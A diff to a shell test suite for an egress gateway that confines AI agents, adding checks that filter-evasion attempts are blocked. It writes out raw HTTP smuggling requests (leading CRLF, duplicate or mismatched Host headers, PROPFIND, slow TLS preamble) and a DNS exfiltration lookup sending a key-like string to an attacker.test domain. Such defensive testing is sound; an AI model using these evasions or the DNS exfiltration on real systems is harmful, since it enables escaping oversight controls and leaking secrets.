@@ -50,6 +50,27 @@ check "agent: cannot change its route (no NET_ADMIN)" ko \
 check "agent: the only path out is the gateway" ok \
   agent sh -c "ip route get 198.18.99.20 | tee /dev/stderr | grep -q 'via 10.99.0.2'"
 
+# --- Review of PR #15: evasions of the HTTP pipeline and of the DNS filter -------------------
+# Raw request (printf format, interpreted inside the agent) to the web server's address, port 80.
+raw() { agent sh -c "printf '$1' | nc -w 5 198.18.99.20 80"; }
+expect_blocked() { local out; out="$(raw "$1")"; printf '%s\n' "$out" | grep -m1 -E 'HTTP/|blocked'; printf '%s' "$out" | grep -q "${2:-blocked by agents-firewall}" && ! printf '%s' "$out" | grep -q hello-from-web; }
+case_crlf()     { expect_blocked 'GET / HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n' && expect_blocked '\r\nGET / HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n'; }
+case_propfind() { expect_blocked 'PROPFIND / HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n'; }
+case_absolute() { expect_blocked 'GET http://allowed.example/ HTTP/1.1\r\nHost: denied.example\r\nConnection: close\r\n\r\n' 'rule host-mismatch'; }
+case_two_hosts() { expect_blocked 'GET / HTTP/1.1\r\nHost: allowed.example\r\nHost: denied.example\r\nConnection: close\r\n\r\n' 'HTTP/1.1 40[03]'; }
+case_slow_tls() { local out; out="$(agent sh -c "(printf '\026'; sleep 2; printf '\003\001\000\005hello') | nc -w 4 198.18.99.20 80" 2>/dev/null)"; echo "received: ${#out} bytes"; [ -z "$out" ]; }
+case_exfil()    { agent sh -c "dig +tries=1 +time=4 akiaiosfodnn7example.exfil.attacker.test A" | grep -E 'status: REFUSED'; }
+case_metrics()  { agent curl -s -m 5 http://10.99.0.2:9090/metrics; }
+case_ca()       { agent curl -s -m 5 http://10.99.0.2:3128/ca.crt | grep -m1 'BEGIN CERTIFICATE'; }
+check "agent: request line with a leading empty line, denied Host -> 403 (never raw L4)" ok case_crlf
+check "agent: unlisted method (PROPFIND), denied Host -> 403" ok case_propfind
+check "agent: absolute URI allowed.example + Host denied.example -> host-mismatch" ok case_absolute
+check "agent: two Host headers -> refused" ok case_two_hosts
+check "agent: slow TLS preamble (first byte, pause) is cut, nothing relayed" ok case_slow_tls
+check "agent: DNS exfiltration name -> REFUSED (never resolved upstream)" ok case_exfil
+check "agent: gateway metrics are not reachable from the agents" ko case_metrics
+check "agent: public inspection CA is served on the proxy port" ok case_ca
+
 echo "== stopping the gateway"
 dc stop gateway >/dev/null
 check "gateway down: no network at all (fail closed)" ko \
